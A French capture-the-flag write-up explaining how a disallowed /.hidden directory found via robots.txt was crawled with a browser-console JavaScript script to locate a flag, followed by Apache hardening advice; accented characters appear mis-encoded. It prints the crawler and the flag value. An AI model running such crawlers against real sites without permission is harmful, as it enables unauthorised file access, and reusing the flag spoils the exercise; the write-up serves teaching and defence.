# Exploitation du Dossier `.hidden` et Crawler pour Trouver le Flag

## 1. Introduction
J'ai exploit√© une **vuln√©rabilit√© d'exposition de fichiers** dans un r√©pertoire cach√© `.hidden` pour trouver un flag. En utilisant un **crawler en JavaScript** ex√©cut√© dans la console du navigateur, j'ai explor√© r√©cursivement les dossiers et sous-dossiers pour lire les fichiers `README` jusqu'√† ce qu'un **chiffre** soit trouv√©, indiquant la pr√©sence du flag.

---

## 2. D√©couverte de la Faille

### **Exploration du `robots.txt`**
En analysant le fichier `robots.txt`, j'ai trouv√© la directive suivante :
```
User-agent: *
Disallow: /.hidden
```

Cela m'a conduit √† explorer le dossier `.hidden` en naviguant vers l'URL :
```
http://10.211.55.2/.hidden/
```

![Files](images/1.png)
---

### **Structure du R√©pertoire `.hidden`**
Le dossier `.hidden` contenait une **structure de dossiers profond√©ment imbriqu√©e**, chacun contenant potentiellement un fichier `README`. Ces fichiers contenaient principalement des **messages de troll**, mais l'un d'eux contenait le **flag**.

---

## 3. Automatisation du Crawling avec un Script JavaScript
Pour explorer efficacement cette structure complexe, j'ai utilis√© le script suivant dans la **console du navigateur** :

```js
const baseURL = "http://10.211.55.2/.hidden/";
let found = false;
let readmeCount = 0;
let checkedReadmes = new Set();

async function exploreDirectory(url) {
    if (found) return;
    try {
        const response = await fetch(url);
        const text = await response.text();
        const links = [...text.matchAll(/href="([^"]+)"/g)].map(m => m[1]);

        for (let link of links) {
            if (link === "../") continue;
            if (link.endsWith('/')) {
                await exploreDirectory(url + link);
            } else {
                if (link.toLowerCase().includes("readme")) {
                    const fileUrl = url + link;
                    if (checkedReadmes.has(fileUrl)) continue;
                    checkedReadmes.add(fileUrl);
                    readmeCount++;
                    const fileResponse = await fetch(fileUrl);
                    const fileText = await fileResponse.text();
                    console.log(`üìÑ Contenu du README :\n${fileText}`);
                    if (/\d/.test(fileText)) {
                        console.log(`üö© Chiffre trouv√© dans ${fileUrl}, arr√™t du script.`);
                        found = true;
                        break;
                    }
                }
            }
        }
    } catch (error) {
        console.error(`‚ùå Erreur lors de l'exploration de ${url} : `, error);
    }
}

async function startCrawling() {
    console.log("üöÄ D√©but de l'exploration...");
    await exploreDirectory(baseURL);
    console.log(`‚úÖ Exploration termin√©e. Nombre total de README trouv√©s : ${readmeCount}`);
}

startCrawling();
```

---

## 4. Obtention du Flag
Le **flag** trouv√© est :
```
d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
```

![Flag](images/2.png)

---

## 5. Impact de la Faille
- **Explorer des r√©pertoires cach√©s** non prot√©g√©s.
- **Lire des fichiers sensibles** comme `README`.

---

## 6. Pr√©vention de la Faille
- **Emp√™cher l'indexation des r√©pertoires** avec `.htaccess` :
```apache
Options -Indexes
```
- **Bloquer l'acc√®s public** :
```apache
<Directory "/path/to/.hidden">
    Require all denied
</Directory>
```

---

## 7. Correction de la Faille
- **D√©placer le dossier `.hidden`** en dehors du r√©pertoire web public.
- **Ajouter une protection avec `.htaccess`** pour bloquer l'acc√®s direct.

---

## 8. Conclusion
Cette exploitation d√©montre l'importance de :
- **Ne pas exposer de r√©pertoires sensibles** dans des environnements de production.
- **Configurer correctement les permissions** pour √©viter l'acc√®s non autoris√©.
- **Utiliser des contre-mesures** comme `.htaccess` pour s√©curiser les fichiers et dossiers confidentiels.
